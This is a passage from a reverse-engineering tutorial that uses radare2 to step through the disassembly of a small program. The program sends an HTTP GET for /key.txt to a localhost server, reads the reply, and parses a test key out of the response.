<span class="err">│</span>           <span class="mh">0x55fa6e273cda</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cdd</span>      <span class="n">e88efbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">bzero</span>      <span class="p">;</span> <span class="kt">void</span> <span class="n">bzero</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ce2</span>      <span class="mi">66</span><span class="n">c78580feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">],</span> <span class="mi">2</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ceb</span>      <span class="mi">488</span><span class="n">b8578feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cf2</span>      <span class="mi">8</span><span class="n">b4014</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cf5</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cf8</span>      <span class="mi">488</span><span class="n">b8578feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cff</span>      <span class="mi">488</span><span class="n">b4018</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d03</span>      <span class="mi">488</span><span class="n">b00</span>         <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d06</span>      <span class="mi">488</span><span class="n">d8d80feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d0d</span>      <span class="mi">4883</span><span class="n">c104</span>       <span class="n">add</span> <span class="n">rcx</span><span class="p">,</span> <span class="mi">4</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d11</span>      <span class="mi">4889</span><span class="n">ce</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d14</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d17</span>      <span class="n">e834fbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">bcopy</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d1c</span>      <span class="mi">8</span><span class="n">b856cfeffff</span>   <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_194h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d22</span>      <span class="mi">0</span><span class="n">fb7c0</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d25</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d27</span>      <span class="n">e8e4faffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">htons</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d2c</span>      <span class="mi">66898582</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_17eh</span><span class="p">],</span> <span class="n">ax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d33</span>      <span class="mi">488</span><span class="n">d8d80feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d3a</span>      <span class="mi">8</span><span class="n">b8570feffff</span>   <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d40</span>      <span class="n">ba10000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x10</span>           <span class="p">;</span> <span class="mi">16</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d45</span>      <span class="mi">4889</span><span class="n">ce</span>  
</code></pre></div></div>
<p>Again this is very similar to what we saw on the previous tutorial.</p>

<p>The program starts by loading the get request string</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="mh">0x55fa6e273beb</span>      <span class="mi">48</span><span class="n">b847455420</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x79656b2f20544547</span> <span class="p">;</span> <span class="err">'</span><span class="n">GET</span> <span class="o">/</span><span class="n">key</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bf5</span>      <span class="mi">48</span><span class="n">ba2e747874</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x545448207478742e</span> <span class="p">;</span> <span class="err">'</span><span class="p">.</span><span class="n">txt</span> <span class="n">HTT</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bff</span>      <span class="mi">488985</span><span class="n">a0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_160h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c06</span>      <span class="mi">488995</span><span class="n">a8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_158h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c0d</span>      <span class="mi">48</span><span class="n">b8502f312e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x550a0d312e312f50</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c17</span>      <span class="mi">48</span><span class="n">ba7365722d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x6e6567412d726573</span> <span class="p">;</span> <span class="err">'</span><span class="n">ser</span><span class="o">-</span><span class="n">Agen</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c21</span>      <span class="mi">488985</span><span class="n">b0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_150h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c28</span>      <span class="mi">488995</span><span class="n">b8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_148h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c2f</span>      <span class="mi">48</span><span class="n">b8743a206e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2e302f636e203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c39</span>      <span class="mi">48</span><span class="n">ba302e310d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x736f480a0d312e30</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c43</span>      <span class="mi">488985</span><span class="n">c0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_140h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c4a</span>      <span class="mi">488995</span><span class="n">c8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_138h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c51</span>      <span class="mi">48</span><span class="n">b8743a2031</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x302e373231203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c5b</span>      <span class="mi">48</span><span class="n">ba2e302e31</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x63410a0d312e302e</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c65</span>      <span class="mi">488985</span><span class="n">d0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_130h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c6c</span>      <span class="mi">488995</span><span class="n">d8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_128h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c73</span>      <span class="mi">48</span><span class="n">b863657074</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2f2a203a74706563</span> <span class="p">;</span> <span class="err">'</span><span class="n">cept</span><span class="o">:</span> <span class="err">*/'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c7d</span>      <span class="mf">488985e0</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_120h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c84</span>      <span class="n">c785e8feffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_118h</span><span class="p">],</span> <span class="mh">0xd0a0d2a</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c8e</span>      <span class="mi">66</span><span class="n">c785ecfeff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_114h</span><span class="p">],</span> <span class="mh">0xa</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c97</span>      <span class="n">c7856cfeffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_194h</span><span class="p">],</span> <span class="mh">0x50</span> <span class="p">;</span> <span class="sc">'P'</span> <span class="p">;</span> <span class="mi">80</span>
</code></pre></div></div>
<p>So the string gets loaded well in memory:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273cb0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffc9a81e5c0</span>
<span class="mh">0x7ffc9a81e5c0</span>  <span class="mh">0x20544547</span> <span class="mh">0x79656b2f</span> <span class="mh">0x7478742e</span> <span class="mh">0x54544820</span>  <span class="n">GET</span> <span class="o">/</span><span class="n">key</span><span class="p">.</span><span class="n">txt</span> <span class="n">HTT</span>
<span class="mh">0x7ffc9a81e5d0</span>  <span class="mh">0x2e312f50</span> <span class="mh">0x550a0d31</span> <span class="mh">0x2d726573</span> <span class="mh">0x6e656741</span>  <span class="n">P</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">..</span><span class="n">User</span><span class="o">-</span><span class="n">Agen</span>
<span class="mh">0x7ffc9a81e5e0</span>  <span class="mh">0x6e203a74</span> <span class="mh">0x2e302f63</span> <span class="mh">0x0d312e30</span> <span class="mh">0x736f480a</span>  <span class="n">t</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">..</span><span class="n">Hos</span>
<span class="mh">0x7ffc9a81e5f0</span>  <span class="mh">0x31203a74</span> <span class="mh">0x302e3732</span> <span class="mh">0x312e302e</span> <span class="mh">0x63410a0d</span>  <span class="n">t</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">..</span><span class="n">Ac</span>
<span class="mh">0x7ffc9a81e600</span>  <span class="mh">0x74706563</span> <span class="mh">0x2f2a203a</span> <span class="mh">0x0d0a0d2a</span> <span class="mh">0x0000000a</span>  <span class="n">cept</span><span class="o">:</span> <span class="err">*/</span><span class="o">*</span><span class="p">.......</span>
</code></pre></div></div>
<p>Then comes the socket creation and initialization through connect</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="mh">0x55fa6e273cb0</span> <span class="n">b</span>    <span class="n">e8ebfbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">socket</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cb5</span>      <span class="mi">898570</span><span class="n">feffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cbb</span>      <span class="mi">488</span><span class="n">d3dfe0100</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>  <span class="p">;</span> <span class="mh">0x55fa6e273ec0</span> <span class="p">;</span> <span class="s">"127.0.0.1"</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc2</span>      <span class="n">e879fbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">gethostbyname</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc7</span>      <span class="mi">48898578</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cce</span>      <span class="mi">488</span><span class="n">d8580feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cd5</span>      <span class="n">be10000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mh">0x10</span>           <span class="p">;</span> <span class="mi">16</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cda</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
</code></pre></div></div>
<p>As well as the buffer initialization with bzero, nothing much to comment.</p>

<p>Then the read from the server:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="mh">0x55fa6e273dd5</span>      <span class="n">e856faffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">read</span>       <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbyte</span><span class="p">)</span>
<span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273dda</span> <span class="n">b</span>    <span class="mi">898574</span><span class="n">feffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_18ch</span><span class="p">],</span> <span class="n">eax</span>
</code></pre></div></div>
<p>So after the read we see the key has been delivered:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273dda</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffc9a81e610</span>
<span class="mh">0x7ffc9a81e610</span>  <span class="mh">0x50545448</span> <span class="mh">0x312e312f</span> <span class="mh">0x30303220</span> <span class="mh">0x0d4b4f20</span>  <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="mi">200</span> <span class="n">OK</span><span class="p">.</span>
<span class="mh">0x7ffc9a81e620</span>  <span class="mh">0x7461440a</span> <span class="mh">0x54203a65</span> <span class="mh">0x202c7568</span> <span class="mh">0x4a203430</span>  <span class="p">.</span><span class="n">Date</span><span class="o">:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mo">04</span> <span class="n">J</span>
<span class="mh">0x7ffc9a81e630</span>  <span class="mh">0x32206e75</span> <span class="mh">0x20303230</span> <span class="mh">0x333a3131</span> <span class="mh">0x39323a31</span>  <span class="n">un</span> <span class="mi">2020</span> <span class="mi">11</span><span class="o">:</span><span class="mi">31</span><span class="o">:</span><span class="mi">29</span>
<span class="mh">0x7ffc9a81e640</span>  <span class="mh">0x544d4720</span> <span class="mh">0x65530a0d</span> <span class="mh">0x72657672</span> <span class="mh">0x7041203a</span>   <span class="n">GMT</span><span class="p">..</span><span class="n">Server</span><span class="o">:</span> <span class="n">Ap</span>
<span class="mh">0x7ffc9a81e650</span>  <span class="mh">0x65686361</span> <span class="mh">0x342e322f</span> <span class="mh">0x2039322e</span> <span class="mh">0x75625528</span>  <span class="n">ache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">29</span> <span class="p">(</span><span class="n">Ubu</span>
<span class="mh">0x7ffc9a81e660</span>  <span class="mh">0x2975746e</span> <span class="mh">0x614c0a0d</span> <span class="mh">0x4d2d7473</span> <span class="mh">0x6669646f</span>  <span class="n">ntu</span><span class="p">)..</span><span class="n">Last</span><span class="o">-</span><span class="n">Modif</span>
<span class="mh">0x7ffc9a81e670</span>  <span class="mh">0x3a646569</span> <span class="mh">0x64655720</span> <span class="mh">0x3330202c</span> <span class="mh">0x6e754a20</span>  <span class="n">ied</span><span class="o">:</span> <span class="n">Wed</span><span class="p">,</span> <span class="mo">03</span> <span class="n">Jun</span>
<span class="mh">0x7ffc9a81e680</span>  <span class="mh">0x32303220</span> <span class="mh">0x38302030</span> <span class="mh">0x3a36303a</span> <span class="mh">0x47203434</span>   <span class="mi">2020</span> <span class="mi">08</span><span class="o">:</span><span class="mo">06</span><span class="o">:</span><span class="mi">44</span> <span class="n">G</span>
<span class="mh">0x7ffc9a81e690</span>  <span class="mh">0x0a0d544d</span> <span class="mh">0x67615445</span> <span class="mh">0x3122203a</span> <span class="mh">0x61352d32</span>  <span class="n">MT</span><span class="p">..</span><span class="n">ETag</span><span class="o">:</span> <span class="s">"12-5a</span><span class="err">
</span><span class="s">0x7ffc9a81e6a0  0x38393237 0x33303432 0x22353031 0x63410a0d  72982403105"</span><span class="p">..</span><span class="n">Ac</span>
<span class="mh">0x7ffc9a81e6b0</span>  <span class="mh">0x74706563</span> <span class="mh">0x6e61522d</span> <span class="mh">0x3a736567</span> <span class="mh">0x74796220</span>  <span class="n">cept</span><span class="o">-</span><span class="n">Ranges</span><span class="o">:</span> <span class="n">byt</span>
<span class="mh">0x7ffc9a81e6c0</span>  <span class="mh">0x0a0d7365</span> <span class="mh">0x746e6f43</span> <span class="mh">0x2d746e65</span> <span class="mh">0x676e654c</span>  <span class="n">es</span><span class="p">..</span><span class="n">Content</span><span class="o">-</span><span class="n">Leng</span>
<span class="mh">0x7ffc9a81e6d0</span>  <span class="mh">0x203a6874</span> <span class="mh">0x0a0d3831</span> <span class="mh">0x746e6f43</span> <span class="mh">0x2d746e65</span>  <span class="n">th</span><span class="o">:</span> <span class="mi">18</span><span class="p">..</span><span class="n">Content</span><span class="o">-</span>
<span class="mh">0x7ffc9a81e6e0</span>  <span class="mh">0x65707954</span> <span class="mh">0x6574203a</span> <span class="mh">0x702f7478</span> <span class="mh">0x6e69616c</span>  <span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span>
<span class="mh">0x7ffc9a81e6f0</span>  <span class="mh">0x0a0d0a0d</span> <span class="mh">0x303e6b3c</span> <span class="mh">0x34333231</span> <span class="mh">0x38373635</span>  <span class="p">....</span><span class="o">&lt;</span><span class="n">k</span><span class="o">&gt;</span><span class="mo">01234567</span><span class="mi">8</span>
<span class="mh">0x7ffc9a81e700</span>  <span class="mh">0x6b2f3c39</span> <span class="mh">0x00000a3e</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="mi">9</span><span class="o">&lt;/</span><span class="n">k</span><span class="o">&gt;</span><span class="p">...........</span>
</code></pre></div></div>
<p>Bus as said, the server included http headers and useless information, we proceed to parse the key:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e2739ca</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">CALL</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x55fa6e273df4</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">┌</span> <span class="mi">198</span><span class="o">:</span> <span class="n">sym</span><span class="p">.</span><span class="n">getKey</span> <span class="p">(</span><span class="kt">int64_t</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">arg2</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_20h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x20</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_18h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x18</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_10h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_4h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">int64_t</span> <span class="n">arg1</span> <span class="err">@</span> <span class="n">rdi</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">int64_t</span> <span class="n">arg2</span> <span class="err">@</span> <span class="n">rsi</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739ca</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739cb</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739ce</span>      <span class="mi">48897</span><span class="n">de8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">],</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">arg1</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739d2</span>      <span class="mf">488975e0</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">],</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">arg2</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739d6</span>      <span class="n">c745f0000000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739dd</span>      <span class="n">c745f4000000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e2739e4</span>      <span class="n">c745f8000000</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="mi">0</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x55fa6e2739eb</span>      <span class="n">e98a000000</span>     <span class="n">jmp</span> <span class="mh">0x55fa6e273a7a</span>
<span class="err">│</span>      <span class="err">┌──</span><span class="o">&gt;</span> <span class="mh">0x55fa6e2739f0</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739f3</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739f6</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739fa</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e2739fd</span>      <span class="mi">0</span><span class="n">fb600</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>      <span class="err">╎│</span>   <span class="mh">0x55fa6e273a00</span>      <span class="mi">3</span><span class="n">c3c</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3c</span>            <span class="p">;</span> <span class="mi">60</span>
<span class="err">│</span>     <span class="err">┌───</span><span class="o">&lt;</span> <span class="mh">0x55fa6e273a02</span>      <span class="mi">7572</span>           <span class="n">jne</span> <span class="mh">0x55fa6e273a76</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a04</span>      <span class="mi">8</span><span class="n">b45f0</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_10h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a07</span>      <span class="mi">4898</span>           <span class="n">cdqe</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a09</span>      <span class="mi">488</span><span class="n">d5001</span>       <span class="n">lea</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a0d</span>      <span class="mi">488</span><span class="n">b45e8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_18h</span><span class="p">]</span>
<span class="err">│</span>     <span class="err">│╎│</span>   <span class="mh">0x55fa6e273a11</span>      <span class="mi">4801</span><span class="n">d0</span>         <span class="n">add</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rdx</span>
